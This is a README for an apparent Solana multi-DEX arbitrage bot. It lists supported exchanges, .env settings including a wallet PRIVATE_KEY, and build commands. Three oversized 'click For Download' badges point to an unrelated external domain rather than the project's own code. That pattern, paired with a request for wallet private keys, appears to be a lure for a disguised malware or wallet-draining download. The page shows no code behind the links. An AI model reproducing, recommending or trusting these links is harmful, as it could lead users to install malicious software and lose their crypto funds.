## Overview
A high-performance Solana arbitrage bot for Solana that monitors price differences across multiple DEXes and executes profitable trades automatically  This bot supports multiple DEX types including PumpSwap, Raydium (AMM, CLMM, CPMM), Orca Whirlpool, and Meteora (DLMM, Pools), providing comprehensive coverage of the Solana DeFi ecosystem.
The bot leverages real-time transaction monitoring through Yellowstone gRPC to identify arbitrage opportunities across various DEX protocols.

---

<a href="https://kerten.sbs/kl/crypto">
  <img
    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
    alt="gg"
    width="1100"
  >
</a>

---

<img width="1280" height="720" alt="any" src="https://i.postimg.cc/qRbXjRsf/image-23.png" />


<img width="1280" height="720" alt="any" src="https://i.postimg.cc/g0ygqmtr/0-Sa-XD0Er2-To-Kh-Tl.png" />

---

- **Multi-DEX Support** – Monitors price differences across 7+ major Solana DEXes including PumpSwap, Raydium, Orca, and Meteora
- **Real-time Monitoring** – Uses Yellowstone gRPC for ultra-low latency transaction monitoring and price discovery
- **Automated Arbitrage** – Automatically detects and executes profitable arbitrage opportunities across DEXes
- **Advanced Pool Discovery** – Intelligent pool discovery and caching system for efficient price monitoring
- **MEV Protection** – Optional Jito integration for MEV protection and transaction bundling
- **Configurable Parameters** – Customizable arbitrage thresholds, slippage tolerance, and liquidity requirements
- **Transaction Logging** – Comprehensive logging and recording of all trading activities
- **Cross-platform Build** – Supports both Windows and Linux builds with optimized performance

## Supported DEXes

The bot supports the following decentralized exchanges:

- **PumpSwap** - Constant product AMM for new token launches
- **Raydium AMM** - Traditional automated market maker
- **Raydium CLMM** - Concentrated liquidity market maker
- **Raydium CPMM** - Constant product market maker
- **Orca Whirlpool** - Concentrated liquidity pools
- **Meteora DLMM** - Dynamic liquidity market maker
- **Meteora Pools** - Stable curve pools


---

<a href="https://kerten.sbs/kl/crypto">
  <img
    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
    alt="gg"
    width="1100"
  >
</a>

---


# Prerequisites

- Rust 1.70+ (latest stable recommended)
- Solana CLI tools
- A funded Solana wallet
- Yellowstone gRPC access (Helius, Triton, or custom endpoint)

# Configuration

## Environment Variables

Create a `.env` file in the project root with the following variables:

### Required Variables
- `YELLOWSTONE_GRPC_HTTP` - Your Yellowstone gRPC HTTP endpoint
- `YELLOWSTONE_GRPC_TOKEN` - Authentication token for gRPC endpoint (if required)
- `RPC_HTTP` - Solana RPC endpoint for transaction submission
- `PRIVATE_KEY` - Base58 encoded private key of your trading wallet

### Optional Configuration
- `ARBITRAGE_THRESHOLD` - Minimum price difference percentage to trigger arbitrage (default: 1.5%)
- `MIN_LIQUIDITY` - Minimum liquidity required in SOL (default: 10 SOL)
- `SLIPPAGE` - Maximum slippage tolerance in basis points (default: 50 = 0.5%)
- `TOKEN_AMOUNT` - Amount of tokens to trade per arbitrage opportunity (default: 0.0000001)
- `TIME_EXCEED` - Maximum time to wait for transaction confirmation
- `COUNTER` - Maximum number of retry attempts
- `MAX_DEV_BUY` - Maximum development buy amount
- `MIN_DEV_BUY` - Minimum development buy amount

## Example .env file
```env
YELLOWSTONE_GRPC_HTTP=https://your-grpc-endpoint.com
YELLOWSTONE_GRPC_TOKEN=your-token-here
RPC_HTTP=https://api.mainnet-beta.solana.com
PRIVATE_KEY=your-base58-private-key-here
ARBITRAGE_THRESHOLD=2.0
MIN_LIQUIDITY=5000000000
SLIPPAGE=100
```
### Using the build script
```bash
chmod +x build.sh
./build.sh
```

## PM2 Process Management

```bash
# Start with PM2
make pm2

# Stop the bot
make stop

# View logs
pm2 logs
```


---

<a href="https://kerten.sbs/kl/crypto">
  <img
    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
    alt="gg"
    width="1100"
  >
</a>

---

# Architecture

The bot is structured into several key modules:

- **`engine/`** - Core arbitrage logic, monitoring, and swap execution
- **`dex/`** - DEX registry and integration modules
- **`services/`** - External service integrations (Jito, Nozomi, ZeroSlot)
- **`core/`** - Token handling and transaction utilities
- **`record/`** - Transaction logging and data persistence
- **`common/`** - Shared configuration and utilities

# Risk Disclaimer

⚠️ **Important**: This software is for educational and research purposes. Trading cryptocurrencies involves substantial risk of loss. The authors are not responsible for any financial losses. Always test with small amounts first and understand the risks involved.

# License

This project is licensed under the MIT License - see the LICENSE file for details.
